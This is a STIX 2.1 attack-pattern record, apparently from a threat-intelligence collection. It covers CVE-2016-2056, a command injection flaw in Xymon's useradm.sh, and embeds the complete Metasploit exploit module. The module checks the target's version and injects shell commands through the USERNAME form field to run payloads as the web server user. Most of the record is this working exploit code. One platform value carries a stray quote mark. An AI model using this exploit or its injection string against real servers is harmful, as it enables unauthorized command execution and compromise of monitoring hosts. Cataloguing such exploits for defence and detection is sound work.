{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2473b5e4-ffac-47a4-958b-34d7fcb37b90",
    "created": "2024-08-14T17:12:52.558247Z",
    "modified": "2024-08-14T17:12:52.558251Z",
    "name": "Xymon useradm Command Execution",
    "description": " This module exploits a command injection vulnerability in Xymon versions before 4.3.25 which allows authenticated users to execute arbitrary operating system commands as the web server user.  When adding a new user to the system via the web interface with `useradm.sh`, the user's username and password are passed to `htpasswd` in a call to `system()` without validation.  This module has been tested successfully on Xymon version 4.3.10 on Debian 6.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/xymon_useradm_cmd_exec.rb",
            "external_id": "xymon_useradm_cmd_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2056"
        },
        {
            "source_name": "reference",
            "url": "https://lists.xymon.com/pipermail/xymon/2016-February/042986.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.securityfocus.com/archive/1/537522/100/0/threaded"
        },
        {
            "source_name": "reference",
            "url": "https://sourceforge.net/p/xymon/code/7892/"
        },
        {
            "source_name": "reference",
            "url": "https://www.debian.org/security/2016/dsa-3495"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Xymon useradm Command Execution',\n      'Description' => %q{\n        This module exploits a command injection vulnerability in Xymon\n        versions before 4.3.25 which allows authenticated users\n        to execute arbitrary operating system commands as the web\n        server user.\n\n        When adding a new user to the system via the web interface with\n        `useradm.sh`, the user's username and password are passed to\n        `htpasswd` in a call to `system()` without validation.\n\n        This module has been tested successfully on Xymon version 4.3.10\n        on Debian 6.\n      },\n      'License'     => MSF_LICENSE,\n      'Author'      => [\n        'Markus Krell', # Discovery\n        'bcoles'        # Metasploit\n      ],\n      'References'  =>\n        [\n          ['CVE', '2016-2056'],\n          ['PACKETSTORM', '135758'],\n          ['URL', 'https://lists.xymon.com/pipermail/xymon/2016-February/042986.html'],\n          ['URL', 'https://www.securityfocus.com/archive/1/537522/100/0/threaded'],\n          ['URL', 'https://sourceforge.net/p/xymon/code/7892/'],\n          ['URL', 'https://www.debian.org/security/2016/dsa-3495']\n        ],\n      'DisclosureDate' => '2016-02-14',\n      'Platform'       => %w(unix linux solaris bsd),\n      'Targets'        =>\n        [\n          [\n            'Unix CMD',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Payload' => {\n                'Space' => 2048,\n                'BadChars' => \"\\x00\\x0A\\x0D\",\n                'DisableNops' => true,\n                'Compat' =>\n                {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'generic perl python netcat php'\n                }\n              }\n            }\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'linux',\n              'Arch'     => [ARCH_X86,ARCH_X64],\n            }\n          ],\n          [\n            'Solaris',\n            {\n              'Platform' => 'solaris',\n              'Arch' => [ARCH_X86]\n            }\n          ],\n          [\n            'BSD',\n            {\n              'Platform' => 'bsd',\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0))\n    register_options([\n      OptString.new('TARGETURI', [\n        true, 'The base path to Xymon secure CGI directory', '/xymon-seccgi/'\n      ]),\n      OptString.new('USERNAME', [true, 'The username for Xymon']),\n      OptString.new('PASSWORD', [true, 'The password for Xymon'])\n    ])\n  end\n\n  def user\n    datastore['USERNAME']\n  end\n\n  def pass\n    datastore['PASSWORD']\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'useradm.sh'),\n      'authorization' => basic_auth(user, pass)\n    })\n\n    unless res\n      vprint_status \"#{peer} - Connection failed\"\n      return CheckCode::Unknown\n    end\n\n    if res.code == 401\n      vprint_status \"#{peer} - Authentication failed\"\n      return CheckCode::Unknown\n    end\n\n    if res.code == 404\n      vprint_status \"#{peer} - useradm.sh not found\"\n      return CheckCode::Safe\n    end\n\n    unless res.body.include?('Xymon')\n      vprint_status \"#{peer} - Target is not a Xymon server.\"\n      return CheckCode::Safe\n    end\n\n    version = res.body.scan(/>Xymon ([\\d\\.]+)</).flatten.first\n\n    unless version\n      vprint_status \"#{peer} - Could not determine Xymon version\"\n      return CheckCode::Detected\n    end\n\n    vprint_status \"#{peer} - Xymon version #{version}\"\n\n    if Rex::Version.new(version) >= Rex::Version.new('4.3.25')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def execute_command(cmd, opts = {})\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'useradm.sh'),\n      'method' => 'POST',\n      'authorization' => basic_auth(user, pass),\n      'vars_post' => Hash[{\n        'USERNAME'   => \"';#{cmd} & echo '\",\n        'PASSWORD'   => '',\n        'SendCreate' => 'Create'\n      }.to_a.shuffle]\n    }, 5)\n\n    return if session_created?\n\n    unless res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    end\n\n    if res.code == 401\n      fail_with(Failure::NoAccess, 'Authentication failed')\n    end\n\n    unless res.code == 500\n      fail_with(Failure::Unknown, 'Unexpected reply')\n    end\n\n    print_good \"#{peer} - Payload sent successfully\"\n\n    res\n  end\n\n  def exploit\n    unless [Exploit::CheckCode::Detected, Exploit::CheckCode::Appears].include?(check)\n      fail_with Failure::NotVulnerable, 'Target is not vulnerable'\n    end\n\n    if payload.arch.first == 'cmd'\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(linemax: 1_500)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-02-14",
    "x_mitre_platforms": [
        "bsd'"
    ]
}